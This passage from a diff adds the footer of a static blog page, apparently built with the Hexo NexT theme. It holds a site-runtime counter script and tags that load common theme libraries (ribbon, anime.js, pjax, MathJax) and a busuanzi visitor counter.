+    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
+
+    if (openOnPC) {
+      document.getElementById("runtime").innerHTML = "Running: " + diffYears + " years " + diffDays + " days " + diffHours + " hours " + diffMinutes + " mins " + diffSeconds + " secs";
+    } else {
+      document.getElementById("runtime").innerHTML = "Running: " + diffYears + "y " + diffDays + "d " + diffHours + "h " + diffMinutes + "m " + diffSeconds + "s";
+    }
+  }
+
+  var showOnMobile = false;
+  var openOnPC = isPC();
+  var start = new Date();
+  siteTime(openOnPC, start);
+
+  if (!openOnPC && !showOnMobile) {
+    document.getElementById('site-runtime').style.display = 'none';
+  }
+</script>
+
+
+
+    </div>
+  </footer>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="https://cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@next-theme/pjax@0.5.0/pjax.min.js" integrity="sha256-3NkoLDrmHLTYj7csHIZSr0MHAFTXth7Ua/DDt4MRUAg=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js","integrity":"sha256-r+3itOMtGGjap0x+10hu6jW/gZCzxHsoKrOd7gyRSGY="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+</body>
+</html>
